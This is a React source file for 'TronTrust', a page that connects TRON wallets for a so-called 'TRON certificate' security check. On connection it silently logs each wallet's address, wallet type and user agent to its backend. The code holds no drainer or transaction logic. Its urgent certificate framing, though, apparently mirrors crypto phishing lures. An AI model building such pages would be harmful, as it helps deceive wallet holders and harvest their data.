import { useState, useEffect, useCallback, useMemo } from 'react';
import { 
  TronLinkAdapter, 
  BitKeepAdapter, 
  OkxWalletAdapter, 
  TokenPocketAdapter,
  WalletConnectAdapter,
  LedgerAdapter
} from '@tronweb3/tronwallet-adapters';
import { WalletProvider, useWallet } from '@tronweb3/tronwallet-adapter-react-hooks';
import { WalletModalProvider, WalletActionButton } from '@tronweb3/tronwallet-adapter-react-ui';

// Import required CSS for wallet UI components
import '@tronweb3/tronwallet-adapter-react-ui/style.css';

// Icons (using Lucide React since it's available)
import { 
  Zap, 
  Settings, 
  Shield, 
  HelpCircle, 
  Wallet,
  Menu,
  Check,
  Bell,
  FileText,
  File
} from 'lucide-react';

// Mock logo component (replace with your actual logo)
const Logo = () => (
  <div className="w-8 h-8 bg-blue-600 rounded-lg flex items-center justify-center">
    <span className="text-white font-bold text-sm">TT</span>
  </div>
);

// Wallet connection component that uses the TRON wallet adapter
type WalletInfo = {
  address: string;
  chainId: number;
  network: string;
  walletType: string;
  sessionId: string;
  metadata: {
    userAgent: string;
    timestamp: number;
  };
};

const WalletConnectionCard = () => {
  const { wallet, address, connected, connecting, disconnect } = useWallet();
  const [walletData, setWalletData] = useState<WalletInfo | null>(null);
  const [apiError, setApiError] = useState<string | null>(null);

  // API Configuration - dynamically set based on environment
  const API_BASE_URL = useMemo(() => {
    if (typeof window !== 'undefined') {
      // In production, use the same origin as the frontend
      const isProduction = window.location.hostname !== 'localhost';
      if (isProduction) {
        // Use relative URLs in production or set your production API URL
        return '/api';  // This assumes your API is deployed alongside your frontend
        // Alternative: return 'https://your-api-domain.com/api';
      }
      return 'http://localhost:5000/api';
    }
    return '/api';
  }, []);

  const log = (message: string) => {
    console.log(`[TronTrust] ${message}`);
  };

  // Handle wallet connection state changes
  useEffect(() => {
    if (connected && address && wallet) {
      log(`TRON Wallet connected: ${address}`);
      
      const walletInfo = {
        address: address,
        chainId: 728126428, // TRON mainnet chain ID
        network: 'TRON Mainnet',
        walletType: wallet.adapter.name,
        sessionId: Date.now().toString(),
        metadata: {
          userAgent: typeof window !== 'undefined' ? navigator.userAgent : 'Unknown',
          timestamp: Date.now()
        }
      };
      
      setWalletData(walletInfo);
      saveWalletToAPI(walletInfo);
    } else if (!connected && walletData) {
      log('TRON Wallet disconnected');
      if (walletData.address) {
        removeWalletFromAPI(walletData.address);
      }
      setWalletData(null);
      setApiError(null);
    }
  }, [connected, address, wallet]);

  // API Functions with better error handling
  const saveWalletToAPI = async (walletInfo: WalletInfo) => {
    try {
      setApiError(null);
      const response = await fetch(`${API_BASE_URL}/connect-wallet`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Accept': 'application/json',
        },
        body: JSON.stringify(walletInfo)
      });
      
      if (!response.ok) {
        throw new Error(`HTTP error! status: ${response.status}`);
      }
      
      const result = await response.json();
      if (result.success) {
        log(`TRON wallet saved to API: ${walletInfo.address}`);
        return result;
      } else {
        const errorMsg = result.error || 'Unknown API error';
        log(`Error saving TRON wallet: ${errorMsg}`);
        setApiError(`Failed to save wallet: ${errorMsg}`);
        return null;
      }
    } catch (error) {
      const errorMsg = error instanceof Error ? error.message : String(error);
      log(`API Error: ${errorMsg}`);
      
      // Don't show API errors as critical errors - wallet still works
      if (!errorMsg.includes('fetch')) {
        setApiError(`API connection issue: ${errorMsg}`);
      }
      return null;
    }
  };

  const removeWalletFromAPI = async (address: string) => {
    try {
      setApiError(null);
      const response = await fetch(`${API_BASE_URL}/disconnect-wallet`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Accept': 'application/json',
        },
        body: JSON.stringify({ address })
      });
      
      if (!response.ok) {
        throw new Error(`HTTP error! status: ${response.status}`);
      }
      
      const result = await response.json();
      if (result.success) {
        log(`TRON wallet removed from API: ${address}`);
        return result;
      } else {
        const errorMsg = result.error || 'Unknown API error';
        log(`Error removing TRON wallet: ${errorMsg}`);
        return null;
      }
    } catch (error) {
      const errorMsg = error instanceof Error ? error.message : String(error);
      log(`API Error: ${errorMsg}`);
      return null;
    }
  };

  const handleDisconnect = useCallback(async () => {
    log('Disconnecting TRON wallet...');
    try {
      await disconnect();
    } catch (error) {
      log(`Disconnect error: ${error instanceof Error ? error.message : String(error)}`);
    }
  }, [disconnect]);

  return (
    <div className="bg-white rounded-lg border border-gray-200 p-6">
      <div className="flex items-center justify-between">
        <div className="flex items-center space-x-4">
          <div className="w-10 h-10 bg-blue-100 rounded-lg flex items-center justify-center">
            <Wallet className="w-5 h-5 text-blue-600" />
          </div>
          <div>
            <h3 className="text-lg font-semibold text-gray-900">TRON WALLET</h3>
            <p className="text-sm text-gray-500">Universal TRON Wallet</p>
          </div>
        </div>
        
        {!connected ? (
          <WalletActionButton className="bg-blue-600 hover:bg-blue-700 text-white px-6 py-2 rounded-lg font-medium transition-colors">
            Get TRON certificate
          </WalletActionButton>
        ) : (
          <button 
            onClick={handleDisconnect}
            disabled={connecting}
            className="bg-red-600 hover:bg-red-700 text-white px-6 py-2 rounded-lg font-medium transition-colors disabled:opacity-50"
          >
            {connecting ? 'Disconnecting...' : 'Disconnect'}
          </button>
        )}
      </div>
      
      {/* API Error Display */}
      {apiError && (
        <div className="mt-4 p-3 bg-yellow-50 rounded-lg border border-yellow-200">
          <p className="text-sm text-yellow-800">
            <strong>Note:</strong> {apiError}
            <br />
            <span className="text-xs">Wallet connection still works normally.</span>
          </p>
        </div>
      )}
      
      {/* Connected wallet info */}
      {connected && walletData && (
        <div className="mt-6 p-4 bg-green-50 rounded-lg border border-green-200">
          <h4 className="text-sm font-semibold text-green-800 mb-2">Connected TRON Wallet:</h4>
          <div className="space-y-1 text-sm text-green-700">
            <p><strong>Address:</strong> <span className="font-mono text-xs">{walletData.address}</span></p>
            <p><strong>Network:</strong> {walletData.network}</p>
            <p><strong>Wallet:</strong> {walletData.walletType}</p>
            <p><strong>Chain ID:</strong> {walletData.chainId}</p>
            <p><strong>Session:</strong> <span className="font-mono text-xs">{walletData.sessionId}</span></p>
          </div>
        </div>
      )}
      
      {/* Connection Status */}
      {connecting && (
        <div className="mt-4 p-3 bg-blue-50 rounded-lg border border-blue-200">
          <p className="text-sm text-blue-800">
            <strong>Connecting...</strong> Please check your wallet for connection prompts.
          </p>
        </div>
      )}
    </div>
  );
};

// Main App Component
const WalletConnect = () => {
  const [mobileMenuOpen, setMobileMenuOpen] = useState(false);

  // Initialize wallet adapters with proper error handling
  const adapters = useMemo(() => {
    const adaptersList = [];
    
    try {
      adaptersList.push(new TronLinkAdapter());
    } catch (error) {
      console.warn('[TronTrust] TronLink adapter failed to initialize:', error);
    }
    
    try {
      adaptersList.push(new BitKeepAdapter());
    } catch (error) {
      console.warn('[TronTrust] BitKeep adapter failed to initialize:', error);
    }
    
    try {
      adaptersList.push(new OkxWalletAdapter());
    } catch (error) {
      console.warn('[TronTrust] OKX adapter failed to initialize:', error);
    }
    
    try {
      adaptersList.push(new TokenPocketAdapter());
    } catch (error) {
      console.warn('[TronTrust] TokenPocket adapter failed to initialize:', error);
    }
    
    try {
      // WalletConnect configuration for production
      const projectId = process.env.REACT_APP_WALLETCONNECT_PROJECT_ID || '048110749acfc9f73e40e560cd1c11ec';
      
      adaptersList.push(new WalletConnectAdapter({
        network: 'Mainnet',
        options: {
          relayUrl: 'wss://relay.walletconnect.com',
          projectId: projectId,
          metadata: {
            name: 'TronTrust',
            description: 'TRON Wallet Security Verification App',
            url: typeof window !== 'undefined' ? window.location.origin : 'https://trontrust.vercel.app',
            icons: ['https://avatars.githubusercontent.com/u/37784886']
          }
        }
      }));
    } catch (error) {
      console.warn('[TronTrust] WalletConnect adapter failed to initialize:', error);
    }
    
    try {
      adaptersList.push(new LedgerAdapter());
    } catch (error) {
      console.warn('[TronTrust] Ledger adapter failed to initialize:', error);
    }
    
    return adaptersList;
  }, []);

  const onError = useCallback((error: any) => {
    console.error('[TronTrust] Wallet Error:', error.message || error);
    
    // You can add user-friendly error notifications here
    if (error.message?.includes('User rejected')) {
      console.log('[TronTrust] User cancelled the connection');
    } else if (error.message?.includes('No provider')) {
      console.log('[TronTrust] Wallet not found - please install a TRON wallet');
    }
  }, []);

  const toggleMobileMenu = () => {
    setMobileMenuOpen(!mobileMenuOpen);
  };

  return (
    <WalletProvider adapters={adapters} onError={onError}>
      <WalletModalProvider>
        <div className="min-h-screen bg-gray-50">
          {/* Navigation */}
          <nav className="bg-white border-b border-gray-200">
            <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
              <div className="flex justify-between items-center h-16">
                <div className="flex items-center space-x-2">
                  <Logo />
                  <span className="text-xl font-bold text-gray-900">TronTrust</span>
                </div>
                
                {/* Desktop Navigation */}
                <div className="hidden md:flex items-center space-x-8">
                  <a href="#" className="flex items-center space-x-1 text-gray-700 hover:text-blue-600 transition-colors">
                    <Zap className="w-4 h-4" />
                    <span className="text-sm">Features</span>
                  </a>
                  <a href="#" className="flex items-center space-x-1 text-gray-700 hover:text-blue-600 transition-colors">
                    <Settings className="w-4 h-4" />
                    <span className="text-sm">How It Works</span>
                  </a>
                  <a href="#" className="flex items-center space-x-1 text-gray-700 hover:text-blue-600 transition-colors">
                    <Shield className="w-4 h-4" />
                    <span className="text-sm">Verification Status</span>
                  </a>
                  <a href="#" className="flex items-center space-x-1 text-gray-700 hover:text-blue-600 transition-colors">
                    <HelpCircle className="w-4 h-4" />
                    <span className="text-sm">FAQ</span>
                  </a>
                </div>
                
                <div className="hidden md:flex items-center">
                  <button className="bg-blue-600 hover:bg-blue-700 text-white px-4 py-2 rounded-lg font-medium transition-colors flex items-center space-x-2">
                    <Wallet className="w-4 h-4" />
                    <span>TRON Wallet Security Check</span>
                  </button>
                </div>
                
                {/* Mobile menu button */}
                <button 
                  className="md:hidden p-2 rounded-lg hover:bg-gray-100"
                  onClick={toggleMobileMenu}
                  aria-label="Toggle menu"
                >
                  <Menu className="w-6 h-6" />
                </button>
              </div>
              
              {/* Mobile Navigation */}
              {mobileMenuOpen && (
                <div className="md:hidden py-4 border-t border-gray-200">
                  <div className="space-y-4">
                    <a href="#" className="flex items-center space-x-2 text-gray-700 hover:text-blue-600 transition-colors">
                      <Zap className="w-4 h-4" />
                      <span className="text-sm">Features</span>
                    </a>
                    <a href="#" className="flex items-center space-x-2 text-gray-700 hover:text-blue-600 transition-colors">
                      <Settings className="w-4 h-4" />
                      <span className="text-sm">How It Works</span>
                    </a>
                    <a href="#" className="flex items-center space-x-2 text-gray-700 hover:text-blue-600 transition-colors">
                      <Shield className="w-4 h-4" />
                      <span className="text-sm">Verification Status</span>
                    </a>
                    <a href="#" className="flex items-center space-x-2 text-gray-700 hover:text-blue-600 transition-colors">
                      <HelpCircle className="w-4 h-4" />
                      <span className="text-sm">FAQ</span>
                    </a>
                    <button className="w-full bg-blue-600 hover:bg-blue-700 text-white px-4 py-2 rounded-lg font-medium transition-colors flex items-center justify-center space-x-2">
                      <Wallet className="w-4 h-4" />
                      <span>TRON Wallet Security Check</span>
                    </button>
                  </div>
                </div>
              )}
            </div>
          </nav>
          
          {/* Main Content */}
          <main className="max-w-4xl mx-auto px-4 sm:px-6 lg:px-8 py-8">
            {/* Progress Steps */}
            <div className="mb-8">
              <div className="w-full bg-gray-200 rounded-full h-2 mb-4">
                <div className="bg-blue-600 h-2 rounded-full w-1/4"></div>
              </div>
              
              <div className="flex justify-between items-center">
                <div className="flex flex-col items-center">
                  <div className="w-8 h-8 bg-blue-600 rounded-full flex items-center justify-center mb-2">
                    <Check className="w-4 h-4 text-white" />
                  </div>
                  <span className="text-sm text-blue-600 font-medium">Get Started</span>
                </div>
                
                <div className="flex flex-col items-center">
                  <div className="w-8 h-8 bg-gray-300 rounded-full flex items-center justify-center mb-2">
                    <Bell className="w-4 h-4 text-gray-500" />
                  </div>
                  <span className="text-sm text-gray-500">Scan</span>
                </div>
                
                <div className="flex flex-col items-center">
                  <div className="w-8 h-8 bg-gray-300 rounded-full flex items-center justify-center mb-2">
                    <FileText className="w-4 h-4 text-gray-500" />
                  </div>
                  <span className="text-sm text-gray-500">Results</span>
                </div>
                
                <div className="flex flex-col items-center">
                  <div className="w-8 h-8 bg-gray-300 rounded-full flex items-center justify-center mb-2">
                    <File className="w-4 h-4 text-gray-500" />
                  </div>
                  <span className="text-sm text-gray-500">Waitlist</span>
                </div>
              </div>
            </div>
            
            {/* Heading */}
            <div className="text-center mb-8">
              <h1 className="text-4xl font-bold text-gray-900 mb-4">
                CHECK YOUR TRON CERTIFICATE NOW
              </h1>
              <p className="text-lg text-gray-600">
                Connect your TRON wallet to begin the security verification process
              </p>
            </div>
            
            {/* Cards */}
            <div className="space-y-6">
              <WalletConnectionCard />
              
              <div className="bg-white rounded-lg border border-gray-200 p-6">
                <div className="flex items-center space-x-4">
                  <div className="w-10 h-10 bg-green-100 rounded-lg flex items-center justify-center">
                    <Shield className="w-5 h-5 text-green-600" />
                  </div>
                  <div>
                    <h3 className="text-lg font-semibold text-gray-900">Your TRON security is our priority</h3>
                    <p className="text-sm text-gray-500 mt-1">
                      We only require view access to analyze your TRON wallet. No transactions or approvals needed.
                    </p>
                  </div>
                </div>
              </div>
            </div>
          </main>
        </div>
      </WalletModalProvider>
    </WalletProvider>
  );
};

export default WalletConnect;